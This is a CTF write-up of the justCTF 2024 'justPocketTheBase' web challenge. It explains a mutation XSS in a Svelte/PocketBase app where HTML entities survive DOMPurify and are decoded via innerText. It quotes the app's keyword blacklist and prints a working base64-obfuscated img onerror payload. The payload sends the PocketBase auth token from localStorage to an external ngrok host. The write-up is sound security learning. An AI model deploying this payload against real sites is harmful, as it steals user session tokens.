---
layout: post
title: justCTF 2024 teaser justPocketTheBase challenge writeup
subtitle: XSS (Constant Suffering Syndrome)
mathjax: true
author: M411K
---

## justPocketTheBase ≈ 44 solves

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/1caba872-34a9-48f4-a5aa-80f069d78e2f)

This challenge took me some time, not because it was hard per-say, but because I've spent too much time focusing on stuff that wasn't vulnreable but seemed sus, things like pocketbase configuration setup, pocketbase file uploading naming normalization, I kept focusing on the side stories rather than the main story, but nonetheless every side quest gave me more insight on the technology used by the author, which is always good, espicially that I haven't had much exposure to pocketbase before now.

## Setup

The challenge uses pocketbase database in the backend, and svelte as the front-end framework responsible for communicating with the api's provided by pocketbase in the backend:

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/8aeead11-29be-4a8b-85bb-8583021954d6)

## Finding the XSS

From the start it was clear that you had to find an XSS, you have the bot, the main application where every user can post "plant" photos with their title, it was the classic setup.

So setting up to find the XSS, this block of code stands up:

```javascript
<script>
	import { onMount } from 'svelte';
	import { pb } from '$lib';

	let blacklist = [
		'window',
		'document',
		'cookie',
		'fetch',
		'navigator',
		'sendbeacon',
		'+',
		'_',
		'script',
		'!',
		'"',
		'#',
		'%',
		"'",
		'(',
		')',
		'*',
		'+',
		',',
		'-',
		'/',
		':',
		'?',
		'@',
		'[',
		']',
		';'
	];
	let id = null;
	let plant = null;
	let isLoading = true;
	let title;

	onMount(async () => {
		const params = new URLSearchParams(window.location.search);
		id = params.get('id');
		try {
			plant = await pb.collection('plants').getOne(id);
		} catch (error) {
			window.location.href = '/';
		} finally {
			isLoading = false;
		}
		setTimeout(() => {
			const sanitizedTitle = DOMPurify.sanitize(plant.title);
			const newTitleElement = document.createElement('div');
			newTitleElement.classList.add('title');
			newTitleElement.innerHTML = sanitizedTitle;
			const safe = newTitleElement.innerText;
			try {
				if (blacklist.some((word) => safe.toLowerCase().includes(word))) {
					throw new Error('not safe!!!');
				}
				title.innerHTML = safe;
			} catch (err) {
				window.location.href = '/';
			}
		}, 100);
	});
</script>
```

Its in `routes/view-plant/+page.svelte` route, this routing scheme is specific to svelte, and manages how the `url/view-plant/id=x` will behave.

```javascript
			const sanitizedTitle = DOMPurify.sanitize(plant.title);
			const newTitleElement = document.createElement('div');
			newTitleElement.classList.add('title');
			newTitleElement.innerHTML = sanitizedTitle;
			const safe = newTitleElement.innerText;
```

The DOMPurify library was on a stable version and finding a 0-day in this labeled `easy` challenge was surely out-of-scope (although its comming in later challenges :haha:), but this way of sanitizing the title, creating an element with that content, then taking the innerText of the latter, then finally adding it to the title element that gonna be displayed to the user was all just over-engineered and opened the door for a mutation XSS (shortened as mXSS), where I will provide HTML entities in the title `&lt;` (`<`), `&gt;` (`>`) which are normally secure, so DOMpurify will not clear them off, but with the first div element, those html entities will be decoded, so when taking in them back and piping them to the legit title, they will be litterally treated as `<`, `>`, and we can create a html tags with them, so now its only a matter of crafting a payload wich is fairly easy, here is my final working payload:

`&lt;img src=1 onerror=location=atob\`amF2YXNjcmlwdDpmZXRjaCgnaHR0cDovLzIudGNwLmV1Lm5ncm9rLmlvOjEwMDMwLycrYnRvYShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgicG9ja2V0YmFzZV9hdXRoIikpLCB7IG1vZGU6ICduby1jb3JzJ30p\`&gt;`

the base64 is just:

```javascript
javascript:fetch('http://2.tcp.eu.ngrok.io:10030/'+btoa(localStorage.getItem(\"pocketbase_auth\")), { mode: 'no-cors'})
```

Surely after reporting my image, I get back the admin token in my flask server:

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/bfa22b15-0358-466c-af62-dd39f808b330)

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/cae7f544-21c7-4cc7-bbd7-908a440835d6)

By changing your token to the flag token, you get can view his uploaded image, and by applying exiftool to it, you find flag:

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/b037e1b7-2700-46e8-8809-845a23ef740f)

![image](https://github.com/mwlik/mwlik.github.io/assets/73129654/76b8be06-72c6-49fc-b17a-f287c3324a17)

And Here you go!: `justCTF{97603333-6596-43fe-aef8-a134c1cc11b4}`
